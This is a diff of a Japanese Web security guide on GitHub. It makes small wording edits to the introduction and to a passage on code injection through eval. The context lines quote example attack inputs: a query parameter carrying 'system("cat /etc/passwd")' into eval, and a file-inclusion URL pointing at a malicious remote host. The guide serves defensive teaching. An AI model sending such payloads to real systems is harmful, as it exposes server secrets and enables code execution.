@@ -1,7 +1,7 @@
 # Webセキュリティガイド
 > 🛡️Webセキュリティのプラクティス集
 
-日々、コンテンツの追加・更新を行なっています。現在のコンテンツは[目次](#目次)を参照してください。
+日々コンテンツの追加・更新を行なっています。現在のコンテンツは[目次](#目次)を参照してください。
 
 内容に誤りや誤解を招く表現などありましたら、[Discussion](https://github.com/zakzackr/web-security-guide/discussions)経由でご指摘いただけますと幸いです。修正させていただきます。簡単な質問や緩いコミュニケーションも常にWelcomeなので、[Discussion](https://github.com/zakzackr/web-security-guide/discussions)でコメントください！！
 
@@ -334,7 +334,7 @@ http://example.com/page.php?file=http://www.trap.com/malicious
 ```
 http://example.com/page.php?data=system("cat /etc/passwd");
 ```
-クエリパラメータ`data`の値をデシリアライズの目的で、`eval`関数の引数に直接渡す実装が存在する場合、`system("cat /etc/passwd");`がコードとして解釈・実行される。
+クエリパラメータ`data`の値をデシリアライズするために、`eval`関数の引数にそのまま渡す実装が存在する場合、`system("cat /etc/passwd");`がコードとして解釈・実行される。
 
 今回のケースは、`cat /etc/passwd`の実行により、サーバ内の秘密情報が外部に漏洩する例だが、その他にもサイトの改ざんや、不正機能の実行など、[OSコマンド・インジェクション攻撃](#osコマンドインジェクション)と同様の被害が発生する。
 
